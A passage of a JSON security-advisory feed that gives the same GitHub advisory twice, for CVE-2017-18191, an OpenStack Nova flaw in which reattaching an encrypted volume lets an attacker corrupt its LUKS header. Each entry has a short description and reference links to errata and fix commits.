            "content_html": "<p>An issue was discovered in OpenStack Nova 15.x through 15.1.0 and 16.x through 16.1.1. By detaching and reattaching an encrypted volume, an attacker may access the underlying raw volume and corrupt the LUKS header, resulting in a denial of service attack on the compute host. (The same code error also results in data loss, but that is not a vulnerability because the user loses their own data.) All Nova setups supporting encrypted volumes are affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-18191\">https://nvd.nist.gov/vuln/detail/CVE-2017-18191</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:2332\">https://access.redhat.com/errata/RHSA-2018:2332</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:2714\">https://access.redhat.com/errata/RHSA-2018:2714</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:2855\">https://access.redhat.com/errata/RHSA-2018:2855</a></li>\n<li><a href=\"https://launchpad.net/bugs/1739593\">https://launchpad.net/bugs/1739593</a></li>\n<li><a href=\"https://review.openstack.org/539893\">https://review.openstack.org/539893</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2018-001.html\">https://security.openstack.org/ossa/OSSA-2018-001.html</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2018/04/20/3\">http://openwall.com/lists/oss-security/2018/04/20/3</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/103104\">http://www.securityfocus.com/bid/103104</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/0225a61fc4557c1257383a654f0741f7ef2ddeac\">https://github.com/openstack/nova/commit/0225a61fc4557c1257383a654f0741f7ef2ddeac</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/5b64a1936122eeb35f37a09f9d38159e1a224c58\">https://github.com/openstack/nova/commit/5b64a1936122eeb35f37a09f9d38159e1a224c58</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/cd3eb60c2c00bcccfa9ccd4bf9d1a96ae7a5cd88\">https://github.com/openstack/nova/commit/cd3eb60c2c00bcccfa9ccd4bf9d1a96ae7a5cd88</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffmh-r67w-m88f\">https://github.com/advisories/GHSA-ffmh-r67w-m88f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ffmh-r67w-m88f",
            "title": "[nova] OpenStack Nova Denial of service attack on the compute host",
            "date_modified": "2024-05-24T05:03:39.000Z",
            "date_published": "2022-05-13T01:44:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ffmh-r67w-m88f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in OpenStack Nova 15.x through 15.1.0 and 16.x through 16.1.1. By detaching and reattaching an encrypted volume, an attacker may access the underlying raw volume and corrupt the LUKS header, resulting in a denial of service attack on the compute host. (The same code error also results in data loss, but that is not a vulnerability because the user loses their own data.) All Nova setups supporting encrypted volumes are affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-18191\">https://nvd.nist.gov/vuln/detail/CVE-2017-18191</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:2332\">https://access.redhat.com/errata/RHSA-2018:2332</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:2714\">https://access.redhat.com/errata/RHSA-2018:2714</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:2855\">https://access.redhat.com/errata/RHSA-2018:2855</a></li>\n<li><a href=\"https://launchpad.net/bugs/1739593\">https://launchpad.net/bugs/1739593</a></li>\n<li><a href=\"https://review.openstack.org/539893\">https://review.openstack.org/539893</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2018-001.html\">https://security.openstack.org/ossa/OSSA-2018-001.html</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2018/04/20/3\">http://openwall.com/lists/oss-security/2018/04/20/3</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/103104\">http://www.securityfocus.com/bid/103104</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/0225a61fc4557c1257383a654f0741f7ef2ddeac\">https://github.com/openstack/nova/commit/0225a61fc4557c1257383a654f0741f7ef2ddeac</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/5b64a1936122eeb35f37a09f9d38159e1a224c58\">https://github.com/openstack/nova/commit/5b64a1936122eeb35f37a09f9d38159e1a224c58</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/cd3eb60c2c00bcccfa9ccd4bf9d1a96ae7a5cd88\">https://github.com/openstack/nova/commit/cd3eb60c2c00bcccfa9ccd4bf9d1a96ae7a5cd88</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffmh-r67w-m88f\">https://github.com/advisories/GHSA-ffmh-r67w-m88f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ffmh-r67w-m88f",
            "title": "[nova] OpenStack Nova Denial of service attack on the compute host",
            "date_modified": "2024-05-24T05:03:39.000Z",
            "date_published": "2022-05-13T01:44:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ffmh-r67w-m88f"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}